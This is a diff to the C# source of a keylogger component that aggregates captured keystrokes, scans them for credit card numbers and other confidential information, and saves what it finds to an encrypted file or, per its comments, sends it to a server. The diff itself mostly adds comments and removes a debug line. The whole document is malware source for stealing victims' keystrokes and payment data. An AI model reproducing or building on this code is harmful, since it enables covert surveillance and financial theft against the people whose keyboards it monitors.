@@ -10,6 +10,10 @@ using System.Windows.Forms;
 
 namespace KeypressAggregator
 {
+    /// <summary>
+    /// Aggregate key presses from the keylogger. Perform analysis on the incoming key press stream to extract useful
+    /// and interesting confidential information since we don't care about the majority of keypresses.
+    /// </summary>
     class KeyPressAggergator
     {
         private ConcurrentQueue<KeyPress> inq;
@@ -27,7 +31,6 @@ namespace KeypressAggregator
         {
             this.outFName = file;
             this.sKey = key;
-            this.toFile = true;
         }
 
         //This writes and encrypts the file with the string data
@@ -66,6 +69,10 @@ namespace KeypressAggregator
             return ci;
         }
 
+        /// <summary>
+        /// Process the keys in the input keypress buffer, try to extract useful information from it. If we find useful
+        /// information send it to the server.
+        /// </summary>
         public void Scan()
         {
             // Counter for credit card
@@ -83,7 +90,6 @@ namespace KeypressAggregator
                 while (inq.TryDequeue(out ks))
                 {
                     bool foundInfo = false;
-                    //Console.WriteLine("Processing: " + ks + ((Keys)ks.Key).ToString());
 
                     // Looks for a credit card number, ie 16 consecutive digits
                     // A number is between 48 and 57. If there is a match, the count
@@ -139,6 +145,7 @@ namespace KeypressAggregator
                             foundInfo = true;
                         }
                     }
+                    // If writing to a file is enabled write to an encrypted file.
                     if (toFile && foundInfo)
                     {
                         EncryptWriteInfo(data, outFName, sKey);
